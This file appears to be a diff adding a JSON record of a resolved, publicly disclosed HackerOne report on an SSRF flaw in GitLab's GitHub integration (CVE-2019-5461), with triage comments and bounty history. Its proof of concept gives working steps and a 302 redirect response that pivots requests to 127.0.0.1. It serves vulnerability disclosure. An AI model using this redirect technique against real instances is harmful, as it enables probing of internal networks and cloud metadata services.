@@ -1,0 +1,377 @@
+{
+  "id": 446593,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDY1OTM=",
+  "url": "https://hackerone.com/reports/446593",
+  "title": "GitLab's GitHub integration is vulnerable to SSRF vulnerability",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-11-18T04:57:11.807Z",
+  "submitted_at": "2018-11-18T04:57:11.807Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-5461"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-08-30T22:18:43.233Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-08-30T22:18:43.168Z",
+  "team_member_agreed_on_going_public_at": "2019-08-30T22:17:25.736Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The GitHub service is vulnerable to a SSRF vulnerability. An attacker may be able to leverage this to make arbitrary `POST` requests in a GitLab instance's internal network. It can also be used to connect to cloud provider's instance metadata API, which may result in the ability to execute commands on the machine.\n\n# Proof of concept\nIn order to reproduce the SSRF, follow the steps below.\n\n - Sign in as any user\n - Create a new project\n - Add a `.gitlab-ci.yml` file with the following contents:\n\n**.gitlab-ci.yml**\n```yml\n# This file is a template, and might need editing before it works on your project.\n# see https://docs.gitlab.com/ce/ci/yaml/README.html for all available options\n\n# you can delete this line if you're not using Docker\nimage: busybox:latest\n\nbefore_script:\n  - echo \"Before script section\"\n  - echo \"For example you might run an update here or install a build dependency\"\n  - echo \"Or perhaps you might print out some debugging details\"\n   \nafter_script:\n  - echo \"After script section\"\n  - echo \"For example you might do some cleanup here\"\n   \nbuild1:\n  stage: build\n  script:\n    - echo \"Do your build here\"\n   \ntest1:\n  stage: test\n  script: \n    - echo \"Do a test here\"\n    - echo \"For example run a test suite\"\n   \ntest2:\n  stage: test\n  script: \n    - echo \"Do another parallel test here\"\n    - echo \"For example run a lint test\"\n   \ndeploy1:\n  stage: deploy\n  script:\n    - echo \"Do your deploy here\"\n```\n\n - Before a minute to make sure the pipelines are created based on the GitLab CI configuration file\n - Set up the GitHub integration and an external repository URL that is under your control (e.g. http://remote_ip/1/2)\n - Click the the `Test settings and save changes` button\n - Observe a request being made to the endpoint that looks something like this:\n\n```\nPOST /api/v3/repos/1/2/statuses/5509244fe4919b85f5c1e0e1a2340805055c32d9 HTTP/1.1\nAccept: application/vnd.github.v3+json\nUser-Agent: Octokit Ruby Gem 4.9.0\nContent-Type: application/json\nAuthorization: token 1\nAccept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3\nConnection: close\nHost: remote_ip\nContent-Length: 158\n\n{\"context\":\"ci/gitlab/master\",\"description\":\"Pipeline passed on GitLab\",\"target_url\":\"https://gitlab.com/jobertabma/123/pipelines/36992118\",\"state\":\"success\"}\n```\n\n - respond with a 302 Found response that redirects back to the internal network using the `Location` header:\n\n**Response**\n```\nHTTP/1.1 302 Found\nLocation: http://127.0.0.1/\nConnection: Close\nContent-Length: 0\n```\n\n - Observe the response of `127.0.0.1` (port 80) being returned in the UI through the error message:\n\n{F377195}\n\n - Or, port 8080:\n\n{F377196}\n\n - Or, port 22:\n\n{F377197}\n\n## Impact\n\nAn attacker may be able to leverage this to make arbitrary `POST` requests in a GitLab instance's internal network. It can also be used to connect to cloud provider's instance metadata API, which may result in the ability to execute commands on the machine.",
+  "bounty_amount": "2000.0",
+  "formatted_bounty": "$2,000",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 377195,
+      "file_name": "Screen_Shot_2018-11-17_at_8.53.28_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/377/195/edce4ca1dcc4e37beb5f2a91124fe7d012dfc08b/Screen_Shot_2018-11-17_at_8.53.28_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-11-17_at_8.53.28_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-11-17_at_8.53.28_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074025Z&X-Amz-Expires=555&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=988b4d6e5c60c274fc2c57f2fa58be1b5d8b135289bd8c547b70a8ea5c7492e5",
+      "file_size": 118900,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 377196,
+      "file_name": "Screen_Shot_2018-11-17_at_8.54.27_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/377/196/5a19f3c712fc574f7139aac45b00ac52ad47586d/Screen_Shot_2018-11-17_at_8.54.27_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-11-17_at_8.54.27_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-11-17_at_8.54.27_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074025Z&X-Amz-Expires=555&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=df061dfa405dcf575b1326d7682c63cb8a7455781c7f064e78a114fc75b63f63",
+      "file_size": 446816,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 377197,
+      "file_name": "Screen_Shot_2018-11-17_at_8.55.21_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/377/197/cd3bac760ef5f46a7af5e0f04dd213112e492960/Screen_Shot_2018-11-17_at_8.55.21_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-11-17_at_8.55.21_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-11-17_at_8.55.21_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074025Z&X-Amz-Expires=555&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=818537dbb5aa8b22ce64fa71b396b3fb767a9467855b763f48b5452a502c1f2c",
+      "file_size": 107763,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 24,
+  "voters": [
+    "securitychops",
+    "mashoud1122",
+    "twi1",
+    "sameerphad72",
+    "spam404",
+    "ali",
+    "mik317",
+    "ahiezer",
+    "theappsec",
+    "dhakal_bibek",
+    "and 14 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 3674001,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @jobert,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 20 business days with an update.\n\nBest regards,\nGitLab Security Team\n",
+      "automated_response": true,
+      "created_at": "2018-11-18T05:43:03.321Z",
+      "updated_at": "2018-11-18T05:43:03.321Z",
+      "actor": {
+        "username": "gitlab-securitybot",
+        "cleared": false,
+        "verified": false,
+        "url": "/gitlab-securitybot",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 3731514,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hello @jobert ,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab-ce/issues/54649.  This issue will be made public 30 days following the release of a patch.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nSecurity Team | GitLab Inc.",
+      "automated_response": false,
+      "created_at": "2018-11-29T14:27:25.945Z",
+      "updated_at": "2018-11-29T14:27:25.945Z",
+      "actor": {
+        "username": "estrike",
+        "cleared": false,
+        "verified": false,
+        "url": "/estrike",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 4091160,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "ETA for fix:\n\nHi @jobert,\n\nThe GitLab issue created from your report is currently scheduled for 2019-04-22.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n",
+      "automated_response": true,
+      "created_at": "2019-02-04T15:09:25.158Z",
+      "updated_at": "2019-02-04T15:09:25.158Z",
+      "actor": {
+        "username": "gitlab-securitybot",
+        "cleared": false,
+        "verified": false,
+        "url": "/gitlab-securitybot",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 5593482,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-08-16T19:23:55.486Z",
+      "updated_at": "2019-08-16T19:23:55.486Z",
+      "additional_data": {
+        "old_severity": "High (7.7)",
+        "new_severity": "Medium",
+        "old_severity_id": 246278,
+        "new_severity_id": 494535
+      },
+      "actor": {
+        "username": "estrike",
+        "cleared": false,
+        "verified": false,
+        "url": "/estrike",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 5593485,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-08-16T19:24:04.587Z",
+      "updated_at": "2019-08-16T19:24:04.587Z",
+      "actor": {
+        "url": "/gitlab",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "GitLab"
+        }
+      },
+      "bounty_amount": "2000.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "gitlab",
+      "collaborator": {
+        "username": "jobert",
+        "url": "/jobert"
+      }
+    },
+    {
+      "id": 5593493,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @jobert ,\n\nThank you again for the report! Your finding has been patched in GitLab version 12.1.2 and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nPlease note, the severity and award were adjusted to reflect similar reports we have received. If you have any questions, please let us know.\n\nWe look forward to your next report!\n\nBest regards,\nEthan\nSecurity Team | GitLab Inc.\n",
+      "automated_response": false,
+      "created_at": "2019-08-16T19:25:36.947Z",
+      "updated_at": "2019-08-16T19:25:36.947Z",
+      "actor": {
+        "username": "estrike",
+        "cleared": false,
+        "verified": false,
+        "url": "/estrike",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "jobert",
+        "url": "/jobert"
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 5701447,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Hello @jobert,\n\nNow that it has been 30 days since a fix was released for this finding, we would like to publicly disclose this report.\n\nPlease note that [the GitLab issue](https://gitlab.com/gitlab-org/gitlab-ce/issues/54649) for this report has now been set to public. If you see any sensitive information that needs to be redacted or removed in that GitLab issue or this report, please let me know here.\n\nThanks again for helping make GitLab more secure.\n\nHave a great day,\nAndrew\nSecurity Team | GitLab",
+      "automated_response": false,
+      "created_at": "2019-08-30T22:17:25.757Z",
+      "updated_at": "2019-08-30T22:17:25.757Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "akelly",
+        "cleared": false,
+        "verified": false,
+        "url": "/akelly",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 5701451,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-08-30T22:18:43.193Z",
+      "updated_at": "2019-08-30T22:18:43.193Z",
+      "actor": {
+        "username": "jobert",
+        "cleared": true,
+        "verified": true,
+        "url": "/jobert",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 5701452,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-08-30T22:18:43.254Z",
+      "updated_at": "2019-08-30T22:18:43.254Z",
+      "actor": {
+        "username": "jobert",
+        "cleared": true,
+        "verified": true,
+        "url": "/jobert",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
